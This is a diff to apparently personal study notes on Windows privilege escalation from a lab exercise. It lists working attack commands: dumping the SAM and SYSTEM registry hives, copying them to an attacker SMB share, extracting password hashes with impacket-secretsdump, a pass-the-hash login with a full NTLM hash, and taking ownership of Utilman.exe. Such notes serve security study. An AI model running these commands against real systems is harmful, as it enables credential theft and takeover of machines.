@@ -187,13 +187,15 @@ Privileges
 	[Complete list of privileges](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)
 	Find ways to exploit: [here](https://github.com/gtworek/Priv2Admin)
 	If `SeBackupPriviledge` we can read any file
-		`reg save hklm\system C:\Users\THMBackup\system.hive`
-		`reg save hklm\sam C:\Users\THMBackup\sam.hive`
-		atk: `sudo impacket-smbserver -smb2support -username THMBackup -password CopyMaster555 myshare ../dirname`
+		`reg save hklm\system .\system.hive`
+		`reg save hklm\sam .\sam.hive`
+		atk: `sudo impacket-smbserver -smb2support -username user -password password myshare ../dirname`
+		`net use \\10.10.15.2\myshare /USER:user password`
 		`copy sam.hive \\10.18.21.236\myshare`
 		`copy system.hive \\10.18.21.236\myshare`
 		atk: `impacket-secretsdump -sam sam.hive -system system.hive LOCAL`
 		atk: `impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 administrator@10.10.62.147`
+		- or we can [[SeBackupPriviledge]]
 	if `SeTakeOwnershipPrivilege` we can take ownership of any object on the system, including files and registry keys
 		`takeown /f C:\Windows\System32\Utilman.exe`
 		`icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F`
